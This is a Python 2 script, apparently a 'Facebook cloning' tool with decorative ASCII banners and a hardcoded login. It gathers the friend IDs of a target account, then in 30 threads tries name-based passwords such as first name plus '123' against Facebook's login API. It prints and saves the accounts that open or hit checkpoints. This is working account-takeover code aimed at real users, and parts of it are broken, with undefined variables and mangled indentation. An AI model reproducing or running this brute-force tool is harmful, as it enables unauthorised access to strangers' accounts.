# Ustad# SIDRA5# Thuglife# Somibro# Gamz#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)


def tik():
    titik = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mW\x1b[1;93ma\x1b[1;95mi\x1b[1;96mt\x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)
def exxb():
    print '[!] \x1b[1;91m MOST WELL \x1b[3;92;40m COME\x1b[1;95m SO\x1b[1;97mMI \x1b[1;91m\x1b[0;34;40m'
    os.sys.clear()        

back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
os.system("clear")
print """
\033[1;97m■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■

\033[1;92m░██████╗\033[0;93m░█████╗\033[0;91m░███╗░░░███╗\033[0;96m██╗
\033[1;92m██╔════╝\033[0;93m██╔══██╗\033[0;91m████╗░████║\033[0;96m██║
\033[1;92m╚█████╗\033[0;93m░██║░░██║\033[0;91m██╔████╔██║\033[0;96m██║
\033[1;92m░╚═══██╗\033[0;93m██║░░██║\033[0;91m██║╚██╔╝██║\033[0;96m██║
\033[1;92m██████╔╝\033[0;93m╚█████╔╝\033[0;91m██║░╚═╝░██║\033[0;96m██║
\033[1;92m╚═════╝\033[0;93m░░╚════╝\033[0;91m░╚═╝░░░░░╚═╝\033[0;96m╚═╝
\033[1;90m■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
\033[1;92m██████╗\033[1;93m░██████╗\033[1;91m░░█████╗\033[1;96m░███╗░░██╗\033[1;95m██████╗░
\033[1;92m██╔══██╗\033[1;93m██╔══██╗\033[1;91m██╔══██╗\033[1;96m████╗░██║\033[1;95m██╔══██╗
\033[1;92m██████╦╝\033[1;93m██████╔╝\033[1;91m███████║\033[1;96m██╔██╗██║\033[1;95m██║░░██║
\033[1;92m██╔══██╗\033[1;93m██╔══██╗\033[1;91m██╔══██║\033[1;96m██║╚████║\033[1;95m██║░░██║
\033[1;92m██████╦╝\033[1;93m██║░░██║\033[1;91m██║░░██║\033[1;96m██║░╚███║\033[1;95m██████╔╝
\033[1;92m╚═════╝\033[1;93m░╚═╝░░╚═╝\033[1;91m╚═╝░░╚═╝\033[1;96m╚═╝░░╚══╝\033[1;95m╚═════╝░
\033[1;96m■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
\033[1;90m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░████░░░░░░░░░░░░░░░████░░░░░
░░░░███░░░░░░░░░░░░░░░░░░░███░░░░
░░░███░░░░░░░░░░░░░░░░░░░░░███░░░
░░███░░░░░░░░░░░░░░░░░░░░░░░███░░
░███░░░░░░░░░░░░░░░░░░░░░░░░░███░
\033[1;90m████░░░░░░░░░░░░░░░░░░░░░░░░░████
████░░░░░░░░░░░░░░░░░░░░░░░░░████
██████░░░░░░░███████░░░░░░░██████
█████████████████████████████████
█████████████████████████████████
\033[1;90m░███████████████████████████████░
░░████░███████████████████░████░░
░░░░░░░███\033[1;91m\033[1;90m▀███████████\033[1;90m\033[1;90m▀███░░░░░░░
░░░░░░████\033[1;91m──\033[1;90m▀███████▀\033[1;91m──\033[1;90m████░░░░░░
░░░░░░█████\033[1;91m───\033[1;90m█████\033[1;91m───\033[1;90m█████░░░░░░
░░░░░░███████▄█████▄███████░░░░░░
░░░░░░░███████████████████░░░░░░░
░░░░░░░░█████████████████░░░░░░░░
░░░░░░░░░███████████████░░░░░░░░░
░░░░░░░░░░█████████████░░░░░░░░░░
░░░░░░░░░░░███████████░░░░░░░░░░░
\033[1;90m░░░░░░░░░░███──▀▀▀──███░░░░░░░░░░
░░░░░░░░░░███─█████─███░░░░░░░░░░
░░░░░░░░░░░███─███─███░░░░░░░░░░░
░░░░░░░░░░░░█████████░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░




"""

####Logo####

logo1 = """
\033[1;92m░██████╗\033[0;93m░█████╗\033[0;91m░███╗░░░███╗\033[0;96m██╗
\033[1;92m██╔════╝\033[0;93m██╔══██╗\033[0;91m████╗░████║\033[0;96m██║
\033[1;92m╚█████╗\033[0;93m░██║░░██║\033[0;91m██╔████╔██║\033[0;96m██║
\033[1;92m░╚═══██╗\033[0;93m██║░░██║\033[0;91m██║╚██╔╝██║\033[0;96m██║
\033[1;92m██████╔╝\033[0;93m╚█████╔╝\033[0;91m██║░╚═╝░██║\033[0;96m██║
\033[1;92m╚═════╝\033[0;93m░░╚════╝\033[0;91m░╚═╝░░░░░╚═╝\033[0;96m╚═╝
.....-:¦:-
......(
.......)\
.....(,,")...-:¦:-
..*******..(.     \033[1;93mUSE FAST 4g INTERNET
-[▓▓▓▓]...)\.  \033[1;92m WHATSAPP \033[1;93m03455453538
-[▓▓▓▓]..(,,").....-:¦:-.   \033[1;96m  YOUR BOY SOMI
-[▓▓▓▓].*****.....).       
-[▓▓▓▓][▒▒▒]...../(
-[▓▓▓▓][▒▒▒]...(,,").....-:¦:-
-[▓▓▓▓][▒▒▒]__,||,__.....)
-[▓▓▓▓][▒▒▒][████] ..../(
-[▓▓▓▓][▒▒▒][████] ..(,,")
-[▓▓▓▓][▒▒▒][████] _.,||,.
-[▓▓▓▓][▒▒▒][████] [▒▒▒]
-[▓▓▓▓][▒▒▒][████] [▒▒▒]
█▓▒▒.█▓▒▒.█▓▒▒.█▓▒▒.█▓

"""
logo2 = """
\033[1;92m░██████╗\033[0;93m░█████╗\033[0;91m░███╗░░░███╗\033[0;96m██╗
\033[1;92m██╔════╝\033[0;93m██╔══██╗\033[0;91m████╗░████║\033[0;96m██║
\033[1;92m╚█████╗\033[0;93m░██║░░██║\033[0;91m██╔████╔██║\033[0;96m██║
\033[1;92m░╚═══██╗\033[0;93m██║░░██║\033[0;91m██║╚██╔╝██║\033[0;96m██║
\033[1;92m██████╔╝\033[0;93m╚█████╔╝\033[0;91m██║░╚═╝░██║\033[0;96m██║
\033[1;92m╚═════╝\033[0;93m░░╚════╝\033[0;91m░╚═╝░░░░░╚═╝\033[0;96m╚═╝
\033[1;90m■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
\033[1;92m██████╗\033[1;93m░██████╗\033[1;91m░░█████╗\033[1;96m░███╗░░██╗\033[1;95m██████╗░
\033[1;92m██╔══██╗\033[1;93m██╔══██╗\033[1;91m██╔══██╗\033[1;96m████╗░██║\033[1;95m██╔══██╗
\033[1;92m██████╦╝\033[1;93m██████╔╝\033[1;91m███████║\033[1;96m██╔██╗██║\033[1;95m██║░░██║
\033[1;92m██╔══██╗\033[1;93m██╔══██╗\033[1;91m██╔══██║\033[1;96m██║╚████║\033[1;95m██║░░██║
\033[1;92m██████╦╝\033[1;93m██║░░██║\033[1;91m██║░░██║\033[1;96m██║░╚███║\033[1;95m██████╔╝
\033[1;92m╚═════╝\033[1;93m░╚═╝░░╚═╝\033[1;91m╚═╝░░╚═╝\033[1;96m╚═╝░░╚══╝\033[1;95m╚═════╝░
\033[1;91m________________________________________
_______________________11_______________
____________________1__¶¶_______________
___________________1_1¶¶¶1______________
__________________11_¶¶¶¶_______________
_________________11_¶¶¶¶1_______________
________________1__¶¶1_1________________
_______________1_1¶¶¶__1________________
_______________1_1¶¶¶___________________
_____________11_¶¶1¶¶¶¶_________________
______________1¶¶¶¶1¶¶1_________________
_______________1¶¶111¶__________________
_________________111¶¶__________________
_________________1¶¶¶¶__________________
\033[1;94m_________________11111__________________
_________________11__1__________________
_________________11__1__________________
_________________11111__________________
_________________11111__________________
_________________111_1__________________
_________________11__1__________________
_________________11111__________________
_________________11111__________________
_________________11111__________________
\033[1;96m_________________11__11_________________
_________________11__11_________________
_________________111111_________________
_________________111111_________________
_________________11__11_________________
_________________111111_________________
_________________111111_________________
_________________11__11_________________
_________________11__11_________________
_________________111111_________________
_________________111111_________________
_________________111111_________________
_________________1_11_1_________________
\033[1;91m_________________111111_________________
_______1_________111111_________________
_____1¶¶_________111111_________________
____1¶¶¶_________111111_________________
____¶¶¶¶_________111111_________________
____¶¶¶¶1________111111_________________
____¶¶¶¶¶________111111___________1_____
____1¶¶¶¶¶1____11111111__________¶¶¶____
_____¶¶¶¶¶¶¶¶¶¶¶\033[1;93m1111111\033[1;91m__________¶¶¶1___
_____1¶¶¶¶¶¶¶¶¶¶\033[1;93m1111111\033[1;91m_________1¶¶¶1___
______¶¶¶¶¶¶¶¶¶¶\033[1;93m11111111\033[1;91m_______11¶¶¶____
______1¶¶¶¶¶¶¶¶¶\033[1;93m1_111111\033[1;91m¶___111_1¶¶¶____
_______¶¶¶¶¶¶¶¶¶\033[1;93m11111111\033[1;91m¶¶¶1¶¶1_¶¶¶_____
________¶¶¶¶¶¶¶¶\033[1;93m11111111\033[1;91m¶¶¶11¶¶¶¶¶1_____
________¶¶¶¶¶¶¶¶\033[1;93m111111111\033[1;91m¶¶¶¶¶¶¶¶¶______
________\033[1;92m¶¶¶¶¶¶¶¶¶1¶¶¶111¶¶¶¶¶1¶¶¶_______
________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_______
_______1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1______
_______¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶¶¶______
______\033[1;94m¶¶¶¶¶¶¶¶¶¶\033[1;94m11111111\033[1;91m¶¶¶1¶¶¶¶¶¶¶_____
_____\033[1;94m¶¶¶¶¶¶¶¶¶¶¶\033[1;94m11111111\033[1;91m¶¶¶1¶1¶¶¶¶¶¶____
____\033[1;94m¶¶¶¶¶¶¶¶¶¶¶¶\033[1;93m1111¶111\033[1;91m¶¶1¶¶¶¶¶¶¶¶¶¶___
___1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶1__
___¶¶¶¶¶¶¶¶¶¶¶1¶¶1111111¶1¶¶¶¶¶11¶¶¶¶¶__
__¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1_
__¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1_¶¶¶¶_
_\033[1;95m1¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_
_\033[1;95m1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_
__\033[1;95m¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_
__\033[1;95m1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_
___\033[1;95m1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__
_____\033[1;95m¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1___
_______\033[1;95m1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1______
\033[1;97m LOG MARI RACE KAR K HIT HOTA
MA CHEZ KIA ITNA DIA HINT BILO


"""
CorrectUsername = "somi"
CorrectPassword = "awan"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m\x1b[1;92mBRAND NAME\x1b[1;93m►\x1b[1;93m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m \x1b[1;93mBRAND PASSWORD\x1b[1;92m►\x1b[1;92m")
        if (password == CorrectPassword):
            print"Successful.Login"+ username #Dev:SOMI
	    time.sleep(1)
            loop = 'false'
        else:
            print "\033[1;90mWrong "
            os.system('xdg-open https://youtu.be/-eHfLvqWoZo')
    else:
        print "\033[1;90mWrong "
        os.system('xdg-open https://youtu.be/-eHfLvqWoZo')



##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    jalan ('\033[1;30m═════════════════════════════════════════════════════════════════════════════════════════════')
    time.sleep(0.05)
    jalan ('\033[0;97m◣1◢\x1b[1;96m PAKISTAN\x1b[1;92m SERIES')
    time.sleep(0.05)
    jalan ('\x1b[0;97m◣0◢\033[1;91m ◣Exit◢ ')
    time.sleep(0.05)
    jalan ('\033[1;30m═════════════════════════════════════════════════════════════════════════════════════════════')
    pilih_login()

def pilih_login():
    bch = raw_input('\n\n \x1b[1;96m►   ')
    if bch == '':
        print '[!] Fill in correctly'
        pilih_login()
    elif bch == '1':
        tik()
    os.system('clear')
    print logo1
    jalan ('\033[0;97m███◣SELECT◢███')
    time.sleep(0.05)
    jalan ('\033[1;97m◣1◢\x1b[1;93m Jazz')
    time.sleep(0.05)
    jalan ('\033[1;97m◣2◢\x1b[1;92m Zong')
    time.sleep(0.05)
    jalan ('\033[1;97m◣3◢\x1b[1;95m Warid')
    time.sleep(0.05)
    jalan ('\033[1;97m◣4◢\x1b[1;96m Ufone')
    time.sleep(0.05)
    jalan ('\033[1;97m◣5◢\x1b[1;91m Telenor')
    time.sleep(0.05)
    jalan ('\033[1;97m◣0◢\x1b[1;96mSomi youtube channel')
    time.sleep(0.05)
    print 45*'█'
    action()

def action():
	bch = raw_input('\n\033[1;90m► \033[1;97m')
	if bch =='':
		print '[!] Fill in correctly'
		action()
	elif bch =="1":
		tik()     
		print (logo1)
		os.system("clear")
		idt = raw_input("\033[1;96m[⊱⋕⊰]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			tik()
		print"\033[1;35;37m[⊱⋕⊰] Getting ID Loading process........ "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	
	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id)) 
	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[⊱⋕⊰] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m   ❈     \033[1;91mCp Account Open After 7 days      \033[1;94m  ❈"
	print 42*"\033[1;97m="

	
			
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '123'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;91m[  ✓  ] \x1b[1;92mValid_OK100%'											
				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;93m[ ✖ ] \x1b[1;96mInvalid_CP'
				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']
				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '12345'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;91m[  ✓  ] \x1b[1;92mValid_OK100%'											
				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								
				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;93m[ ✖ ] \x1b[1;96mInvalid_CP'
				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['last_name']+'123'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;91m[  ✓  ] \x1b[1;92mValid_OK100%'								
						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									
						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							
						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;93m[ ✖ ] \x1b[1;96mInvalid_CP'
				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)			
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 44*'-'
	jalan ('[✓] Process Has Been Completed ....')
	print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
	
	print """
	_.█████████████████

_ ██████████████████

████████████████████

█████████████████████

_█___________▄▄▄▄_ ▄▄▄▄_█

_█__█████_▐▓▓▌_▐▓▓▌_█

_█__█████_▐▓▓▌_▐▓▓▌_█

_█__█████_▐▓▓▌_▐▓▓▌_█

_█__█████_▀▀▀▀_ ▀▀▀▀ █✿ ✿

_█__█████_______________ █(\\|/)

_____________██ ______________██

_____________█

______________█

_______________██

_________________██

___________________██

__________________██

_________________███

______________████

___________█████

_________██████

_______██████
"""
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	login()	
          
if __name__ == '__main__':
	login()

    

 
